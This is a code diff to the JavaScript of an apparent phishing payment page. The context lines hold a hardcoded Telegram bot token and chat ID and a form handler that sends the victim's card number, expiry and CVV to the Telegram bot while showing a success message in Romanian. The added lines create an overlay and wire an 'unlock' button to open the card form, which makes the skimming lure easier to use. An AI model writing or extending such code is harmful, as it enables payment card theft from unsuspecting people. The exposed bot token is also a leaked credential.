@@ -1,6 +1,7 @@
 const botToken = "7601944721:AAHVmbhwDNlfIvIzWmx8i9jL0J-EP2ptfls"; // Tokenul botului
 const chatId = "6953089880"; // Chat ID-ul destinat
 
+// Event listener for the payment form submission
 document.getElementById('paymentForm').addEventListener('submit', function(e) {
     e.preventDefault();
 
@@ -26,6 +27,7 @@ CVV: ${cvv}
         .then(data => {
             if (data.ok) {
                 alert("Datele au fost trimise cu succes!");
+                closePaymentForm(); // Close the payment form after submission
             } else {
                 alert("A apărut o eroare la trimiterea datelor.");
             }
@@ -52,3 +54,17 @@ document.getElementById('expiry-date').addEventListener('input', (e) => {
 document.getElementById('cvv').addEventListener('input', (e) => {
     e.target.value = e.target.value.replace(/[^\d]/g, '').slice(0, 3);
 });
+
+// Functions to open and close the payment form
+function openPaymentForm() {
+    document.getElementById('overlay').style.display = 'block'; // Show overlay
+    document.getElementById('paymentFormContainer').style.display = 'block'; // Show payment form
+}
+
+function closePaymentForm() {
+    document.getElementById('overlay').style.display = 'none'; // Hide overlay
+    document.getElementById('paymentFormContainer').style.display = 'none'; // Hide payment form
+}
+
+// Update the button in the button-container to open the payment form
+document.querySelector('.unlock-button').onclick = openPaymentForm;
